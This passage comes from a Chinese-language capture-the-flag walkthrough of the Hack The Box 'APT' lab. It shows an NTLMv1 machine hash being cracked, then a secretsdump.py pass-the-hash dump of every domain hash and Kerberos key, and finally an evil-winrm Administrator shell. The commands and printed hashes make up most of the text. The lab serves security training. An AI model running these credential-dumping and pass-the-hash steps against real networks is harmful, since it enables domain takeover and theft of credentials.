[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
```



整理格式，到 https://crack.sh/

```
NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
```

得到破解后 hash

```
d167c3238864b12f5f82feae86a7f798
```



## 提取域内hashes

这时候可以横向移动 到 $apt 用户，但是更好的想法是看看能不能用 secretsdump.py 根据  `$apt` 用户的凭据导出所有域内的hash

```bash
secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
```

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up... 
```

## 横向到administrator

```bash
└─# evil-winrm -u administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt    
                                        
Evil-WinRM shell v3.5 
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Info: Establishing connection to remote endpoint 
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator

```


